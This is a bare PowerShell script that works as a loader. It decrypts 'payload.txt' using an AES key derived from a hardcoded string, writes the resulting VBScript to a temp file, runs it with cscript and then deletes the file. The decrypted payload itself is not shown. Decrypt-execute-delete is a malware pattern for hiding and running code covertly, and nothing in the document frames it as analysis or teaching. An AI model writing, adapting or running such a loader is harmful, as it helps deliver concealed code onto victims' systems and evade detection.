$encryptedContent = Get-Content -Path "payload.txt" -Raw
$Text = "46N3tmJWPyEZ2zoQ6v3uWh2fFcqSY3EVj4KE1yLzw3uFdxP94FPFNn44Ph11bcRkcrfFAh4dooPyxSVnoPyWV4gnK77mpGp"
$key = [System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($Text))
$iv = [System.Security.Cryptography.MD5]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($Text))
$encryptedBytes = [Convert]::FromBase64String($encryptedContent)
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$aes.IV = $iv[0..15]
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$decryptor = $aes.CreateDecryptor()
$plainTextBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
$decodedVBS = [Text.Encoding]::UTF8.GetString($plainTextBytes)
$tempPath = "$env:TEMP\tempScript.vbs"
Set-Content -Path $tempPath -Value $decodedVBS
Start-Process "cscript.exe" -ArgumentList $tempPath
Start-Sleep -Seconds 1
Remove-Item $tempPath
